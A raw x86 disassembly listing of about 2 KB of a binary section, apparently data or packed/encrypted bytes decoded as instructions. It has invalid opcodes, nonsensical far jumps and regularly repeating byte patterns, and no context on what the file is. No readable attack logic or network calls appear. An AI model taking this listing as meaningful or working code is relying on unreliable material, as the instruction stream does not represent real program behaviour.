  407082:	inc    ecx
  407083:	add    eax,0x10664062
  407088:	inc    ebx
  407089:	bound  ebx,QWORD PTR [edi+0x4181a8f8]
  40708f:	jmp    0x4212:0x6b24508
  407096:	and    dh,BYTE PTR [edx-0x21]
  407099:	fcom   DWORD PTR [edx]
  40709b:	mov    sp,0x68f6
  40709f:	int    0x8
  4070a1:	jno    0x40711b
  4070a3:	out    0x15,al
  4070a5:	add    eax,0x4041cc
  4070aa:	add    BYTE PTR [eax],al
  4070ac:	inc    eax
  4070ad:	inc    eax
  4070ae:	inc    ebx
  4070af:	bound  eax,QWORD PTR [eax]
  4070b1:	inc    eax
  4070b2:	inc    eax
  4070b3:	add    eax,0x62434162
  4070b8:	inc    eax
  4070b9:	js     0x4070cb
  4070bb:	inc    ecx
  4070bc:	add    eax,0x5404325
  4070c1:	bound  eax,QWORD PTR [eax+0x40]
  4070c4:	inc    ecx
  4070c5:	inc    ebx
  4070c6:	dec    edi
  4070c7:	adc    esi,DWORD PTR [edx-0x21]
  4070ca:	dec    ecx
  4070cb:	cwde   
  4070cc:	pop    esp
  4070cd:	retf   
  4070ce:	les    eax,FWORD PTR [ecx+0x30]
  4070d1:	jg     0x4070a4
  4070d3:	sub    BYTE PTR [ecx+0x7221f0b4],0xff
  4070da:	jp     0x407060
  4070dc:	in     al,0x5
  4070de:	dec    ebp
  4070df:	push   0x25
  4070e1:	inc    ecx
  4070e2:	bound  eax,QWORD PTR [ebx+0x0]
  4070e5:	adc    BYTE PTR [eax+0x0],al
  4070e8:	add    eax,0x62410040
  4070ed:	inc    eax
  4070ee:	add    BYTE PTR [ebx-0x34],al
  4070f1:	inc    eax
  4070f2:	add    eax,0x78434040
  4070f7:	bound  eax,QWORD PTR [ecx+0x78]
  4070fa:	add    eax,0x62404043
  4070ff:	adc    ecx,DWORD PTR [eax]
  407101:	icebp  
  407102:	loope  0x407146
  407104:	leave  
  407105:	adc    al,0xc7
  407107:	jb     0x4070e8
  407109:	sbb    edx,DWORD PTR [ecx-0x6336b38b]
  40710f:	jbe    0x407190
  407111:	dec    ecx
  407112:	shr    DWORD PTR [ecx+0x47],cl
  407115:	in     al,dx
  407116:	dec    eax
  407117:	jb     0x407198
  407119:	icebp  
  40711a:	ds inc ecx
  40711c:	inc    eax
  40711d:	add    eax,0x43436240
  407122:	add    eax,0x62004040
  407127:	inc    eax
  407128:	add    BYTE PTR [ecx+0x40],al
  40712b:	inc    ebx
  40712c:	test   BYTE PTR ds:0x58054041,ah
  407132:	inc    eax
  407133:	inc    eax
  407134:	bound  eax,QWORD PTR [eax+0x66]
  407137:	inc    ecx
  407138:	inc    eax
  407139:	add    eax,0x4d424c00
  40713e:	adc    ebx,DWORD PTR [ecx-0x41]
  407141:	pop    esi
  407142:	xchg   esi,eax
  407143:	lock cmp al,0x4
  407146:	fnsave [ecx+0x66]
  407149:	icebp  
  40714a:	xchg   esi,eax
  40714b:	sub    esp,edx
  40714d:	leave  
  40714e:	dec    edx
  40714f:	mov    esp,0x62e37bdd
  407154:	mov    al,ds:0x7071f040
  407159:	adc    DWORD PTR [eax+0x218942c5],ebp
  40715f:	lahf   
  407160:	cdq    
  407161:	dec    esp
  407162:	and    BYTE PTR [edi+0x40430000],al
  407168:	bound  eax,QWORD PTR ds:0x25404110
  40716e:	add    ah,cl
  407170:	inc    ebx
  407171:	add    eax,0x40402562
  407176:	add    BYTE PTR [eax+0x40],al
  407179:	inc    ecx
  40717a:	inc    ecx
  40717b:	add    eax,0x78434025
  407180:	bound  eax,QWORD PTR [eax-0x7c]
  407183:	inc    eax
  407184:	inc    ecx
  407185:	ds inc edi
  407187:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407188:	jno    0x4071fa
  40718a:	adc    esi,eax
  40718c:	loopne 0x407159
  40718e:	or     ebp,DWORD PTR [edx-0x7e]
  407191:	lahf   
  407192:	push   eax
  407193:	into   
  407194:	push   ecx
  407195:	adc    BYTE PTR [ebx+eax*2],bh
  407198:	jno    0x40720a
  40719a:	xchg   ecx,eax
  40719b:	xchg   ebp,eax
  40719c:	inc    ecx
  40719d:	inc    eax
  40719e:	inc    eax
  40719f:	inc    ebx
  4071a0:	int3   
  4071a1:	add    BYTE PTR ds:0x56240,al
  4071a7:	inc    ebx
  4071a8:	inc    eax
  4071a9:	inc    eax
  4071aa:	add    BYTE PTR [ecx+0x62],al
  4071ad:	bound  eax,QWORD PTR [eax]
  4071af:	int3   
  4071b0:	inc    eax
  4071b1:	inc    ebx
  4071b2:	add    eax,0x43624041
  4071b7:	adc    BYTE PTR [ecx+0x5],al
  4071ba:	inc    eax
  4071bb:	retf   
  4071bc:	mov    eax,0x9fe5d064
  4071c1:	dec    esp
  4071c2:	push   edi
  4071c3:	fiadd  WORD PTR ds:0x5e71e1d9
  4071c9:	jnp    0x4071c2
  4071cb:	or     cl,bl
  4071cd:	dec    eax
  4071ce:	daa    
  4071cf:	enter  0x1475,0xfe
  4071d3:	test   eax,0x718d0512
  4071d8:	inc    ebp
  4071d9:	icebp  
  4071da:	add    ebx,esp
  4071dc:	dec    eax
  4071dd:	retf   
  4071de:	sub    edx,DWORD PTR fs:[edx+0x46]
  4071e2:	into   
  4071e3:	cmc    
  4071e4:	adc    eax,0x2f71bb41
  4071e9:	push   ecx
  4071ea:	(bad)  
  4071eb:	icebp  
  4071ec:	retf   
  4071ed:	pusha  
  4071ee:	(bad)  
  4071ef:	push   cs
  4071f0:	push   edx
  4071f1:	mov    edi,0x404362af
  4071f6:	adc    BYTE PTR ds:0x4158cc40,al
  4071fc:	inc    ebx
  4071fd:	bound  eax,QWORD PTR [ecx+0x40]
  407200:	add    eax,0x4140
  407205:	and    eax,0x40400062
  40720a:	add    eax,0x84404340
  40720f:	int3   
  407210:	js     0x407212
  407212:	inc    ecx
  407213:	adc    BYTE PTR [edx+0xf],ah
  407216:	data16 arpl WORD PTR [ecx+edx*8+0x71],bx
  40721b:	repz dec esp
  40721d:	mov    ecx,0x486247da
  407222:	jno    0x4071e1
  407224:	sbb    DWORD PTR [ecx+0x424f560d],edi
  40722a:	jno    0x407275
  40722c:	inc    ebx
  40722d:	stc    
  40722e:	add    BYTE PTR [eax+0x41],al
  407231:	inc    eax
  407232:	inc    ebx
  407233:	bound  ax,DWORD PTR ds:0x40434100
  40723a:	add    eax,0x40054062
  40723f:	bound  eax,QWORD PTR [ecx+0x40]
  407242:	inc    ebx
  407243:	inc    eax
  407244:	add    eax,0x25405841
  407249:	bound  eax,QWORD PTR [eax+0x43]
  40724c:	inc    eax
  40724d:	adc    ch,ah
  40724f:	test   al,0x28
  407251:	xor    DWORD PTR [ecx+edx*1-0x65],edx
  407255:	lahf   
  407256:	mov    dh,0xb7
  407258:	jge    0x40725c
  40725a:	jo     0x4072b2
  40725c:	inc    ecx
  40725d:	das    
  40725e:	fs clc 
  407260:	test   al,0x47
  407262:	mov    bh,0x99
  407264:	aad    0x27
  407266:	stc    
  407267:	test   al,0x40
  407269:	inc    ecx
  40726a:	inc    ebx
  40726b:	inc    eax
  40726c:	add    eax,0x43406262
  407271:	inc    ecx
  407272:	adc    BYTE PTR [eax],al
  407274:	inc    eax
  407275:	add    eax,0x43000562
  40727a:	add    BYTE PTR [ecx+0x40],al
  40727d:	inc    eax
  40727e:	add    eax,0x400062
  407283:	inc    ebx
  407284:	inc    eax
  407285:	js     0x4072c8
  407287:	inc    ecx
  407288:	bound  eax,QWORD PTR [eax+0x10]
  40728b:	test   al,0x70
  40728d:	inc    edi
  40728e:	je     0x40722d
  407290:	fcom   DWORD PTR [ecx]
  407292:	mov    BYTE PTR [eax],al
  407294:	call   0x8fbc:0x30a3091
  40729b:	cmp    esi,DWORD PTR [eax+0x44]
  40729e:	jp     0x40722c
  4072a0:	mov    esi,0x540620d
  4072a5:	inc    ecx
  4072a6:	add    BYTE PTR [ebx+0x40],al
  4072a9:	inc    eax
  4072aa:	inc    ecx
  4072ab:	inc    eax
  4072ac:	inc    eax
  4072ad:	bound  eax,QWORD PTR ds:0x5624300
  4072b3:	add    BYTE PTR [eax+0x40],al
  4072b6:	add    BYTE PTR [ecx+0x43],al
  4072b9:	add    BYTE PTR [eax+0x41],al
  4072bc:	add    eax,0x40436200
  4072c1:	inc    eax
  4072c2:	add    eax,0xfd635262
  4072c7:	push   edx
  4072c8:	pop    esi
  4072c9:	push   eax
  4072ca:	(bad)  
  4072cb:	int    0x42
  4072cd:	add    DWORD PTR [eax+0x23],esi
  4072d0:	mov    bl,0x9a
  4072d2:	dec    ebp
  4072d3:	adc    al,ah
  4072d5:	popf   
  4072d6:	loopne 0x407346
  4072d8:	jno    0x407314
  4072da:	std    
  4072db:	mov    eax,0xb270f467
  4072e0:	xchg   ecx,eax
  4072e1:	inc    ecx
  4072e2:	inc    eax
  4072e3:	add    eax,0x41624340
  4072e8:	test   BYTE PTR [eax],al
  4072ea:	and    eax,0x404043
  4072ef:	add    BYTE PTR ds:0x626210,al
  4072f5:	add    eax,0x43404140
  4072fa:	inc    eax
  4072fb:	inc    ecx
  4072fc:	add    eax,0x10664062
  407301:	inc    ebx
  407302:	bound  ebx,QWORD PTR [edx]
  407304:	and    al,BYTE PTR ds:0x33c32809
  40730a:	pop    edi
  40730b:	leave  
  40730c:	cli    
  40730d:	int    0x94
  40730f:	pop    ebp
  407310:	jo     0x4072e2
  407312:	xor    DWORD PTR [ebx+0x348448d4],edx
  407318:	es mov bh,0xb7
  40731b:	add    eax,0x4041cc
  407320:	add    BYTE PTR [eax],al
  407322:	inc    eax
  407323:	inc    eax
  407324:	inc    ebx
  407325:	bound  eax,QWORD PTR [eax]
  407327:	inc    eax
  407328:	inc    eax
  407329:	add    eax,0x62434162
  40732e:	inc    eax
  40732f:	js     0x407341
  407331:	inc    ecx
  407332:	add    eax,0x5404325
  407337:	bound  eax,QWORD PTR [eax+0x40]
  40733a:	inc    ecx
  40733b:	inc    ebx
  40733c:	imul   ecx,DWORD PTR ds:0x70802c40,0xffffffb5
  407343:	inc    edx
  407344:	mov    al,ds:0xc5553841
  407349:	or     eax,edx
  40734b:	jno    0x40730b
  40734d:	in     al,0xb8
  40734f:	fadd   QWORD PTR [ebp+0x70]
  407352:	mov    edi,0x40b8942c
  407357:	inc    eax
  407358:	dec    ecx
  407359:	ins    BYTE PTR es:[edi],dx
  40735a:	pop    edi
  40735b:	push   eax
  40735c:	pop    ebx
  40735d:	fs stc 
  40735f:	sub    al,0xd8
  407361:	jo     0x407316
  407363:	xor    BYTE PTR [esi],dh
  407365:	stc    
  407366:	mov    esp,0x5e4fc5af
  40736b:	or     BYTE PTR [esi],ch
  40736d:	shl    BYTE PTR ds:0x436241,cl
  407373:	adc    BYTE PTR [eax+0x0],al
  407376:	add    eax,0x62410040
  40737b:	inc    eax
  40737c:	add    BYTE PTR [ebx-0x34],al
  40737f:	inc    eax
  407380:	add    eax,0x78434040
  407385:	bound  eax,QWORD PTR [ecx+0x78]
  407388:	add    eax,0x62404043
  40738d:	add    eax,0x7d40ec2c
  407392:	xor    BYTE PTR [ebx],ch
  407394:	mov    eax,ds:0x409d4987
  407399:	push   ebx
  40739a:	jp     0x4073e2
  40739c:	xchg   esi,eax
  40739d:	jbe    0x4073bb
  40739f:	es inc ecx
  4073a1:	lahf   
  4073a2:	push   esp
  4073a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073a4:	and    bp,WORD PTR [eax+0x7b]
  4073a8:	dec    eax
  4073a9:	into   
  4073aa:	jb     0x407405
  4073ac:	shl    BYTE PTR [esi+edi*2+0x245b40bc],1
  4073b3:	inc    ecx
  4073b4:	inc    eax
  4073b5:	add    eax,0x43436240
  4073ba:	add    eax,0x62004040
  4073bf:	inc    eax
  4073c0:	add    BYTE PTR [ecx+0x40],al
  4073c3:	inc    ebx
  4073c4:	test   BYTE PTR ds:0x58054041,ah
  4073ca:	inc    eax
  4073cb:	inc    eax
  4073cc:	bound  eax,QWORD PTR [eax+0x66]
  4073cf:	inc    ecx
  4073d0:	inc    eax
  4073d1:	add    eax,0x5a22c00
  4073d6:	enter  0x4068,0xce
  4073da:	cmp    eax,0x6287dd76
  4073df:	mov    esp,0x31315f60
  4073e4:	dec    sp
  4073e6:	inc    ebp
  4073e7:	bound  eax,QWORD PTR [eax+0x6]
  4073ea:	xchg   ebp,eax
  4073eb:	ror    dh,0xac
  4073ee:	test   BYTE PTR [eax+0x40],al
  4073f1:	xor    DWORD PTR [edx+0x25],eax
  4073f4:	inc    ebx
  4073f5:	ret    
  4073f6:	add    BYTE PTR [eax],al
  4073f8:	inc    ebx
  4073f9:	inc    eax
  4073fa:	bound  eax,QWORD PTR ds:0x25404110
  407400:	add    ah,cl
  407402:	inc    ebx
  407403:	add    eax,0x40402562
  407408:	add    BYTE PTR [eax+0x40],al
  40740b:	inc    ecx
  40740c:	inc    ecx
  40740d:	add    eax,0x78434025
  407412:	bound  eax,QWORD PTR [eax-0x7c]
  407415:	inc    eax
  407416:	inc    ecx
  407417:	inc    edi
  407418:	inc    eax
  407419:	inc    eax
  40741a:	push   esp
  40741b:	aas    
  40741c:	daa    
  40741d:	test   eax,0x7f6936ac
  407422:	mov    ch,0x56
  407424:	mov    ecx,esp
  407426:	retf   
  407427:	inc    ebp
  407428:	mov    WORD PTR [edx+0x43b791bf],?
  40742e:	adc    eax,0xf7f6e02
  407433:	sub    eax,0xab46a922
  407438:	int    0x95
  40743a:	adc    al,0x74
  40743c:	pop    ss
  40743d:	retf   0x7c40
  407440:	arpl   WORD PTR [edi+0x29],di
  407443:	jp     0x407462
  407445:	adc    eax,0xf8a85640
  40744a:	je     0x40748d
  40744c:	inc    eax
  40744d:	inc    eax
  40744e:	inc    ebx
  40744f:	int3   
  407450:	add    BYTE PTR ds:0x56240,al
  407456:	inc    ebx
  407457:	inc    eax
  407458:	inc    eax
  407459:	add    BYTE PTR [ecx+0x62],al
  40745c:	bound  eax,QWORD PTR [eax]
  40745e:	int3   
  40745f:	inc    eax
  407460:	inc    ebx
  407461:	add    eax,0x43624041
  407466:	adc    BYTE PTR [ecx+0x5],al
  407469:	inc    eax
  40746a:	inc    edi
  40746b:	sub    ebp,esi
  40746d:	addr16 test al,0x5
  407470:	jg     0x407403
  407472:	aaa    
  407473:	inc    esi
  407474:	stos   BYTE PTR es:[edi],al
  407475:	mov    WORD PTR [ecx+eax*2-0x7dfe8d25],?
  40747c:	add    DWORD PTR fs:0x91f57f8e,0xffffffbe
  407484:	cli    
  407485:	sbb    eax,0x436207c9
  40748a:	inc    eax
  40748b:	adc    BYTE PTR ds:0x4158cc40,al
  407491:	inc    ebx
  407492:	bound  eax,QWORD PTR [ecx+0x40]
  407495:	add    eax,0x4140
  40749a:	and    eax,0x40400062
  40749f:	add    eax,0x84404340
  4074a4:	int3   
  4074a5:	js     0x4074a7
  4074a7:	inc    ecx
  4074a8:	adc    BYTE PTR [edx+0xf],ah
  4074ab:	ds push ebx
  4074ad:	push   ebp
  4074ae:	pop    esi
  4074af:	enter  0x43a5,0x76
  4074b3:	jg     0x4074ee
  4074b5:	push   ecx
  4074b6:	inc    ecx
  4074b7:	or     eax,0x21f5e2cb
  4074bc:	adc    BYTE PTR [edx+esi*4-0x22],al
  4074c0:	nop
  4074c1:	les    esp,FWORD PTR [edx+0x7f]
  4074c4:	lahf   
  4074c5:	xchg   edx,eax
  4074c6:	sub    BYTE PTR [ebx],dl
  4074c8:	add    eax,0xc1044154
  4074cd:	scas   eax,DWORD PTR es:[edi]
  4074ce:	(bad)  
  4074cf:	fs inc esp
  4074d1:	icebp  
  4074d2:	add    BYTE PTR [eax+0x41],al
  4074d5:	inc    eax
  4074d6:	inc    ebx
  4074d7:	bound  ax,DWORD PTR ds:0x40434100
  4074de:	add    eax,0x40054062
  4074e3:	bound  eax,QWORD PTR [ecx+0x40]
  4074e6:	inc    ebx
  4074e7:	inc    eax
  4074e8:	add    eax,0x25405841
  4074ed:	bound  eax,QWORD PTR [eax+0x43]
  4074f0:	inc    eax
  4074f1:	adc    BYTE PTR [edi+edi*2-0x6b7dd4d],cl
  4074f8:	imul   ebp,DWORD PTR [eax+0x434d6713],0xffffffe3
  4074ff:	(bad)  
  407500:	sub    BYTE PTR [eax+0x6c],al
  407503:	jg     0x4074f7
  407505:	xor    DWORD PTR [edx+0x292a41f6],edx
  40750b:	dec    edx
  40750c:	dec    DWORD PTR [edi-0x50]
  40750f:	dec    esi
  407510:	nop
  407511:	adc    BYTE PTR [ecx+0x7e],al
  407514:	sub    DWORD PTR [ecx+0x4f],esi
  407517:	add    ax,0x8c42
  40751b:	lods   eax,DWORD PTR ds:[esi]
  40751c:	addr16 into 
  40751e:	rol    esp,cl
  407520:	xchg   DWORD PTR [edi+0x1f],ebp
  407523:	jle    0x407515
  407525:	xchg   esp,eax
  407526:	add    al,0x40
  407528:	inc    ecx
  407529:	inc    ebx
  40752a:	inc    eax
  40752b:	add    eax,0x43406262
  407530:	inc    ecx
  407531:	adc    BYTE PTR [eax],al
  407533:	inc    eax
  407534:	add    eax,0x43000562
  407539:	add    BYTE PTR [ecx+0x40],al
  40753c:	inc    eax
  40753d:	add    eax,0x400062
  407542:	inc    ebx
  407543:	inc    eax
  407544:	js     0x407587
  407546:	inc    ecx
  407547:	bound  eax,QWORD PTR [eax+0x15]
  40754a:	dec    eax
  40754b:	lock test al,0x90
  40754e:	and    DWORD PTR [edx+0x3d],edi
  407551:	jg     0x40751c
  407553:	push   edx
  407554:	adc    BYTE PTR [esi+0x29],bh
  407557:	mov    eax,ds:0xcbbce247
  40755c:	mov    al,ds:0xde5531f3
  407561:	bound  eax,QWORD PTR [eax+0x5]
  407564:	inc    ecx
  407565:	add    BYTE PTR [ebx+0x40],al
  407568:	inc    eax
  407569:	inc    ecx
  40756a:	inc    eax
  40756b:	inc    eax
  40756c:	bound  eax,QWORD PTR ds:0x5624300
  407572:	add    BYTE PTR [eax+0x40],al
  407575:	add    BYTE PTR [ecx+0x43],al
  407578:	add    BYTE PTR [eax+0x41],al
  40757b:	add    eax,0x40436200
  407580:	inc    eax
  407581:	add    eax,0x680d4a62
  407586:	add    eax,0xf1424e7e
  40758b:	xor    bl,cl
  40758d:	stos   DWORD PTR es:[edi],eax
  40758e:	inc    edx
  40758f:	(bad)  
  407590:	aam    0xd1
  407592:	dec    edx
  407593:	dec    esi
  407594:	dec    esp
  407595:	test   eax,0x38257e4e
  40759a:	inc    ecx
  40759b:	inc    eax
  40759c:	add    eax,0x41624340
  4075a1:	test   BYTE PTR [eax],al
  4075a3:	and    eax,0x404043
  4075a8:	add    BYTE PTR ds:0x626210,al
  4075ae:	add    eax,0x43404140
  4075b3:	inc    eax
  4075b4:	inc    ecx
  4075b5:	add    eax,0x10664062
  4075ba:	inc    ebx
  4075bb:	bound  eax,QWORD PTR [eax-0x40]
  4075be:	add    eax,0x5a39ec8f
  4075c3:	lock out dx,al
  4075c5:	add    eax,0x7e5f49cb
  4075ca:	mov    ah,0x37
  4075cc:	xchg   DWORD PTR [bx+di+0x35],edx
  4075d0:	sub    ebx,DWORD PTR [edi]
  4075d2:	or     al,0x23
  4075d4:	shl    DWORD PTR [ecx+ecx*8+0x1a7e79f2],cl
  4075db:	imul   ecx,DWORD PTR [ecx+0x42],0x5b6deb8
  4075e2:	inc    eax
  4075e3:	repz mov edi,0x63691572
  4075e9:	add    eax,0x4041cc
  4075ee:	add    BYTE PTR [eax],al
  4075f0:	inc    eax
  4075f1:	inc    eax
  4075f2:	inc    ebx
  4075f3:	bound  eax,QWORD PTR [eax]
  4075f5:	inc    eax
  4075f6:	inc    eax
  4075f7:	add    eax,0x62434162
  4075fc:	inc    eax
  4075fd:	js     0x40760f
  4075ff:	inc    ecx
  407600:	add    eax,0x5404325
  407605:	bound  eax,QWORD PTR [eax+0x40]
  407608:	inc    ecx
  407609:	inc    ebx
  40760a:	jle    0x40765d
  40760c:	inc    edx
  40760d:	fst    st(0)
  40760f:	retf   
  407610:	xor    BYTE PTR [eax+0x6b],ah
  407613:	push   ecx
  407614:	hlt    
  407615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407616:	mov    ds:0x7e8a0948,al
  40761b:	mov    edi,0x41254e22
  407620:	bound  eax,QWORD PTR [ebx+0x0]
  407623:	adc    BYTE PTR [eax+0x0],al
  407626:	add    eax,0x62410040
  40762b:	inc    eax
  40762c:	add    BYTE PTR [ebx-0x34],al
  40762f:	inc    eax
  407630:	add    eax,0x78434040
  407635:	bound  eax,QWORD PTR [ecx+0x78]
  407638:	add    eax,0x62404043
  40763d:	add    eax,0x5139900d
  407642:	push   ecx
  407643:	jnp    0x4075d4
  407645:	inc    ecx
  407646:	retf   
  407647:	bound  ecx,QWORD PTR [ecx]
  407649:	jge    0x407646
  40764b:	xor    DWORD PTR [ebx-0x1e],ecx
  40764e:	adc    al,cl
  407650:	cmp    al,0xb7
  407652:	pop    esp
  407653:	inc    edx
  407654:	cmp    bh,al
  407656:	dec    esp
  407657:	inc    ebp
  407658:	pop    esp
  407659:	jge    0x4076ac
  40765b:	xor    ch,BYTE PTR [edx]
  40765d:	mov    al,ds:0x9d1135c9
  407662:	or     al,0x3d
  407664:	sbb    dl,BYTE PTR ds:0x7dc9f826
  40766a:	cmp    BYTE PTR [ecx-0x18],al
  40766d:	inc    ecx
  40766e:	inc    esi
  40766f:	inc    ecx
  407670:	inc    eax
  407671:	add    eax,0x43436240
  407676:	add    eax,0x62004040
  40767b:	inc    eax
  40767c:	add    BYTE PTR [ecx+0x40],al
  40767f:	inc    ebx
  407680:	test   BYTE PTR ds:0x58054041,ah
  407686:	inc    eax
  407687:	inc    eax
  407688:	bound  eax,QWORD PTR [eax+0x66]
  40768b:	inc    ecx
  40768c:	inc    eax
  40768d:	add    eax,0x839c4500
  407692:	or     eax,edx
  407694:	dec    ebp
  407695:	ret    
  407696:	inc    eax
  407697:	xchg   ebp,eax
  407698:	adc    eax,0x2d2d457d
  40769d:	outs   dx,DWORD PTR ds:[esi]
  40769e:	pop    ebx
  40769f:	cs retf 
  4076a1:	jmp    0x434076d7
  4076a6:	inc    eax
  4076a7:	bound  eax,QWORD PTR ds:0x25404110
  4076ad:	add    ah,cl
  4076af:	inc    ebx
  4076b0:	add    eax,0x40402562
  4076b5:	add    BYTE PTR [eax+0x40],al
  4076b8:	inc    ecx
  4076b9:	inc    ecx
  4076ba:	add    eax,0x78434025
  4076bf:	bound  eax,QWORD PTR [eax-0x7c]
  4076c2:	inc    eax
  4076c3:	inc    ecx
  4076c4:	jnp    0x4076f0
  4076c6:	cli    
  4076c7:	hlt    
  4076c8:	pop    eax
  4076c9:	dec    eax
  4076ca:	jge    0x407715
  4076cc:	fidivr WORD PTR [esi-0x62]
  4076cf:	mov    DWORD PTR [edx+0xd],esp
  4076d2:	iret   
  4076d3:	mov    cl,0x53
  4076d5:	aam    0xd
  4076d7:	jae    0x40771a
  4076d9:	inc    ebp
  4076da:	jge    0x407697
  4076dc:	int3   
  4076dd:	and    al,0x41
  4076df:	arpl   WORD PTR [eax+0x41],ax
  4076e2:	xor    eax,0x7a7b515f
  4076e7:	xor    al,0x41
  4076e9:	les    edi,FWORD PTR [ebp+0x11]
  4076ec:	addr16 (bad) 
  4076ee:	rol    BYTE PTR [eax+0x28],0x5c
  4076f2:	sbb    eax,DWORD PTR [ecx+0x51]
  4076f5:	mov    ds:0x4041b87a,eax
  4076fa:	inc    eax
  4076fb:	inc    ebx
  4076fc:	int3   
  4076fd:	add    BYTE PTR ds:0x56240,al
  407703:	inc    ebx
  407704:	inc    eax
  407705:	inc    eax
  407706:	add    BYTE PTR [ecx+0x62],al
  407709:	bound  eax,QWORD PTR [eax]
  40770b:	int3   
  40770c:	inc    eax
  40770d:	inc    ebx
  40770e:	add    eax,0x43624041
  407713:	adc    BYTE PTR [ecx+0x5],al
  407716:	inc    eax
  407717:	dec    esp
  407718:	out    0x7d,al
  40771a:	shl    DWORD PTR [ebx+0x23],1
  40771d:	stc    
  40771e:	cmp    eax,0x5a01252a
  407723:	mov    cl,0x4b
  407725:	pushf  
  407726:	ret    
  407727:	int3   
  407728:	inc    ecx
  407729:	jge    0x4076be
  40772b:	cmp    dl,BYTE PTR [edx+0x62]
  40772e:	inc    ebx
  40772f:	inc    eax
  407730:	adc    BYTE PTR ds:0x4158cc40,al
  407736:	inc    ebx
  407737:	bound  eax,QWORD PTR [ecx+0x40]
  40773a:	add    eax,0x4140
  40773f:	and    eax,0x40400062
  407744:	add    eax,0x84404340
  407749:	int3   
  40774a:	js     0x40774c
  40774c:	inc    ecx
  40774d:	adc    BYTE PTR [edx+0xf],ah
  407750:	add    eax,0x67c41569
  407755:	dec    esp
  407756:	push   esp
  407757:	xor    eax,DWORD PTR [ecx+0x34]
  40775a:	inc    ebp
  40775b:	pop    eax
  40775c:	jge    0x4076ef
  40775e:	cmp    ebx,DWORD PTR [edi+ebx*8+0x4d114440]
  407765:	jbe    0x4077d9
  407767:	push   esi
  407768:	dec    esp
  407769:	mov    esp,0x917ccde4
  40776e:	jno    0x407733
  407770:	gs dec ecx
  407772:	push   edx
  407773:	mov    bl,0xb3
  407775:	jp     0x4077b4
  407777:	inc    esp
  407778:	call   0x41d5:0x7c28d456
  40777f:	fwait
  407780:	adc    eax,0x414000c8
  407785:	inc    eax
  407786:	inc    ebx
  407787:	bound  ax,DWORD PTR ds:0x40434100
  40778e:	add    eax,0x40054062
  407793:	bound  eax,QWORD PTR [ecx+0x40]
  407796:	inc    ebx
  407797:	inc    eax
  407798:	add    eax,0x25405841
  40779d:	bound  eax,QWORD PTR [eax+0x43]
  4077a0:	inc    eax
  4077a1:	adc    BYTE PTR ds:0x584a9950,cl
  4077a7:	out    dx,ax
  4077a9:	inc    ecx
  4077aa:	leave  
  4077ab:	lock jl 0x407785
  4077ae:	cmp    DWORD PTR [ebp+0x56],edx
  4077b1:	adc    al,0x25
  4077b4:	call   FWORD PTR [edx+0x60]
  4077b7:	frstor [ebp-0x3d]
  4077ba:	add    eax,0xb1d57ccd
  4077bf:	xchg   edx,eax
  4077c0:	cwde   
  4077c1:	mov    esp,0xbfe5fcc9
  4077c6:	inc    ebx
  4077c7:	aaa    
  4077c8:	outs   dx,DWORD PTR ds:[esi]
  4077c9:	add    eax,0x407c7d44
  4077ce:	adc    ebp,edi
  4077d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077d1:	inc    eax
  4077d2:	inc    ecx
  4077d3:	inc    ebx
  4077d4:	inc    eax
  4077d5:	add    eax,0x43406262
  4077da:	inc    ecx
  4077db:	adc    BYTE PTR [eax],al
  4077dd:	inc    eax
  4077de:	add    eax,0x43000562
  4077e3:	add    BYTE PTR [ecx+0x40],al
  4077e6:	inc    eax
  4077e7:	add    eax,0x400062
  4077ec:	inc    ebx
  4077ed:	inc    eax
  4077ee:	js     0x407831
  4077f0:	inc    ecx
  4077f1:	bound  eax,QWORD PTR [eax-0x35]
  4077f4:	or     al,ah
  4077f6:	retf   
  4077f7:	mov    ch,0x42
  4077f9:	stos   BYTE PTR es:[edi],al
  4077fa:	xchg   esi,eax
  4077fb:	or     cl,bl
  4077fd:	fistp  QWORD PTR [edx+edx*2+0x77]
  407801:	xchg   ebp,eax
  407802:	imul   eax,DWORD PTR [edx+eax*2-0x55],0x31
  407807:	jno    0x40787c
  407809:	pop    es
  40780a:	mov    ecx,0x7c0bcbc9
  40780f:	outs   dx,BYTE PTR ds:[esi]
  407810:	bnd jns 0x4077a7
  407813:	bound  eax,QWORD PTR es:[eax+0x5]
  407817:	inc    ecx
  407818:	add    BYTE PTR [ebx+0x40],al
  40781b:	inc    eax
  40781c:	inc    ecx
  40781d:	inc    eax
  40781e:	inc    eax
  40781f:	bound  eax,QWORD PTR ds:0x5624300
  407825:	add    BYTE PTR [eax+0x40],al
  407828:	add    BYTE PTR [ecx+0x43],al
  40782b:	add    BYTE PTR [eax+0x41],al
  40782e:	add    eax,0x40436200
  407833:	inc    eax
  407834:	add    eax,0x17f24c62
  407839:	icebp  
  40783a:	jl     0x407870
  40783c:	in     al,dx
  40783d:	inc    edi
  40783e:	dec    ecx
  40783f:	repz jl 0x407897
  407842:	ins    DWORD PTR es:[edi],dx
  407843:	icebp  
  407844:	adc    eax,0x7da8885d
  407849:	sbb    eax,0x40419214
  40784e:	add    eax,0x41624340
  407853:	test   BYTE PTR [eax],al
  407855:	and    eax,0x404043
  40785a:	add    BYTE PTR ds:0x626210,al
  407860:	add    eax,0x43404140
  407865:	inc    eax
  407866:	inc    ecx
  407867:	add    eax,0x10664062
  40786c:	inc    ebx
  40786d:	bound  esp,QWORD PTR [esi-0x1c]
  407870:	adc    al,0x12
  407872:	jl     0x40787e
  407874:	std    
  407875:	fiadd  DWORD PTR [eax+0x70]
  407878:	bound  ebp,QWORD PTR [ebx+eiz*2+0x40431779]
  40787f:	sub    BYTE PTR [ebp+edx*1+0x7c],0x4c
  407884:	xchg   ebx,eax
  407885:	test   BYTE PTR [eax+0x44],0xa2
  407889:	retf   
  40788a:	dec    ecx
  40788b:	jne    0x407885
  40788d:	mov    ds:0xcc052648,al
  407892:	inc    ecx
  407893:	inc    eax
  407894:	add    BYTE PTR [eax],al
  407896:	add    BYTE PTR [eax+0x40],al
  407899:	inc    ebx
  40789a:	bound  eax,QWORD PTR [eax]
  40789c:	inc    eax
  40789d:	inc    eax
  40789e:	add    eax,0x62434162
  4078a3:	inc    eax
  4078a4:	js     0x4078b6
  4078a6:	inc    ecx
  4078a7:	add    eax,0x5404325
  4078ac:	bound  eax,QWORD PTR [eax+0x40]
  4078af:	inc    ecx
  4078b0:	inc    ebx
  4078b1:	xor    eax,0x3307b4e
  4078b6:	dec    esp
  4078b7:	inc    ecx
